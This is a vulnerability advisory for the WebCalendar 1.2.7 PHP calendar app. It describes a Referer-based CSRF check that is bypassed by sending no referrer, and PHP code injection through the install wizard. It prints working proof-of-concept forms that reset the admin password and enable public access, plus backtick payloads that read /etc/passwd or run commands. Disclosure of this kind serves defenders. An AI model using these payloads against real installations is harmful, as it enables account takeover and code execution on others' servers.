@@ -1,0 +1,269 @@
+[+] Credits: John Page aka HYP3RLINX
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/WEBCALENDAR-V1.2.7-CSRF-PROTECTION-BYPASS.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+==========================
+www.k5n.us/webcalendar.php
+
+
+
+Product:
+==================
+WebCalendar v1.2.7
+
+WebCalendar is a PHP-based calendar application that can be configured as a
+single-user calendar, a multi-user calendar for groups of users, or as an
+event calendar viewable by visitors. MySQL, PostgreSQL, Oracle, DB2,
+Interbase, MS SQL Server, or ODBC is required.
+
+WebCalendar can be setup in a variety of ways, such as...
+
+A schedule management system for a single person
+A schedule management system for a group of people, allowing one or more
+assistants to manage the calendar of another user
+An events schedule that anyone can view, allowing visitors to submit new
+events
+A calendar server that can be viewed with iCalendar-compliant calendar
+applications like Mozilla Sunbird, Apple iCal or GNOME Evolution or
+RSS-enabled
+applications like Firefox, Thunderbird, RSSOwl, FeedDemon, or BlogExpress.
+
+
+
+
+Vulnerability Type:
+======================
+CSRF PROTECTION BYPASS
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+WebCalendar attempts to uses the HTTP Referer to check that requests are
+originating from same server as we see below.
+
+From WebCalendar "include/functions.php" file on line 6117:
+
+////////////////////////////////////////////////////////////
+
+function require_valide_referring_url ()
+{
+
+ global $SERVER_URL;
+
+
+if ( empty( $_SERVER['HTTP_REFERER'] ) ) {
+
+   // Missing the REFERER value
+
+ //die_miserable_death ( translate ( 'Invalid referring URL' ) );
+
+ // Unfortunately, some version of MSIE do not send this info.
+
+  return true;
+  }
+
+if ( ! preg_match ( "@$SERVER_URL@i", $_SERVER['HTTP_REFERER'] ) ) {
+
+  // Gotcha.  URL of referring page is not the same as our server.
+
+// This can be an instance of XSRF.
+
+// (This may also happen when more than address is used for your server.
+
+// However, you're not supposed to do that with this version of
+
+// WebCalendar anyhow...)
+    die_miserable_death ( translate ( 'Invalid referring URL' ) );
+
+ }
+
+}
+
+/////////////////////////////////////////////////////////////////////////////////////////
+
+However, this can be easily defeated by just not sending a referer. HTML 5
+includes a handy tag <meta name="referrer" content="none"> to omit the
+referer
+when making an HTTP request, currently supported in Chrome, Safari,
+MobileSafari and other WebKit-based browsers. Using this meta tag we send
+no referrer
+and the vulnerable application will then happily process our CSRF requests.
+
+
+
+Exploit code(s):
+===============
+
+1) CSRF Protection Bypass to change Admin password POC. Note: Name of the
+victim user is required for success.
+
+
+<meta name="referrer" content="none">
+
+<form id="CSRF" action="
+http://localhost/WebCalendar-1.2.7/edit_user_handler.php"  method="post">
+<input type="hidden" name="formtype" value="setpassword" />
+<input type="hidden" name="user" value="admin" />
+<input name="upassword1" id="newpass1" type="password" value="1234567"  />
+<input name="upassword2" id="newpass2" type="password"  value="1234567" />
+</form>
+
+
+2) CSRF Protection Bypass modify access controls under "System Settings" /
+"Allow public access"
+
+<meta name="referrer" content="none">
+
+<form id="CSRF_ACCESS_CTRL" action="
+http://localhost/WebCalendar-1.2.7/admin.php" method="post"
+name="prefform"><br />
+<input type="hidden" name="currenttab" id="currenttab" value="settings" />
+<input type="submit" value="Save" name="" />
+<input type="hidden" name="admin_PUBLIC_ACCESS" value="Y"  />
+<script>document.getElementById('CSRF_ACCESS_CTRL').submit()</script>
+</form>
+
+
+#######################################################
+
+Vulnerability Type:
+======================
+PHP Code Injection
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+Since WebCalendars install script is not removed after installation as
+there is no "automatic" removal of it, low privileged users can inject
+arbitrary
+PHP code for the "Database Cache" directory value as no input validation
+exists for this when a user installs the application using the WebCalendar
+walk
+thru wizard.
+
+If WebCalendars installation script is available as part of a default
+image, often as a convenience by some hosting providers, this can be used
+to gain
+code execution on the target system. The only item that is required is the
+user must have privileges to authenticate to the MySQL Database and to run
+the
+install script. So, users who have install wizard access for the
+WebCalendar application will now have ability to launch arbitrary system
+commands on the
+affected host.
+
+One problem we must overcome is WebCalendar filters quotes " so we cannot
+use code like <?php echo "/bin/cat /etc/passwd"; ?> However, we can defeat
+this
+obstacle using the all to forgotten backtick `CMD` operator!.
+
+e.g.
+
+*/?><?php echo `/bin/cat /etc/passwd`; ?>
+
+This results in "settings.php" being injected like...
+
+<?php
+/* updated via install/index.php on Wed, 15 Jun 2016 09:44:34 -0400
+install_password: e99a18c428cb38d5f260853678922e03
+db_type: mysql
+db_host: localhost
+db_database: intranet
+db_login: admin
+db_password: abc123
+db_persistent: false
+db_cachedir: */?><?php echo `/bin/cat /etc/passwd`; ?>
+readonly: false
+user_inc: user.php
+use_http_auth: false
+single_user: false
+# end settings.php */
+?>
+
+
+
+Exploitation steps(s):
+=====================
+
+1) Login to the WebCalendar Installation Wizard.
+
+2) When you get to WebCalendar Installation Wizard Step 2 of the install
+script.
+http://localhost/WebCalendar-1.2.7/WebCalendar-1.2.7/install/index.php?action=switch&page=2
+
+3) Click "Test Settings" button to ensure connection to the Database.
+4) Enter below PHP code for the "Database Cache Directory:" input fields
+value to pop calculator for POC (Windows).
+
+*/?><?php exec(`calc.exe`); ?>
+
+5) Click "Next" button
+6) Click "Next" button
+7) Click "Save settings" button
+
+BOOOOOOOM! "settings.php" gets overwritten and injected with our PHP code.
+
+If you happen to get following error when clicking "Test Settings" button,
+"Failure Reason: Database Cache Directory does not exist", just click back
+button then forward or just "Test settings" button again to try get past
+the error.
+
+
+Disclosure Timeline:
+===============================
+Vendor Notification:  No replies
+July 4, 2016 : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+6.8 (Medium)
+CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
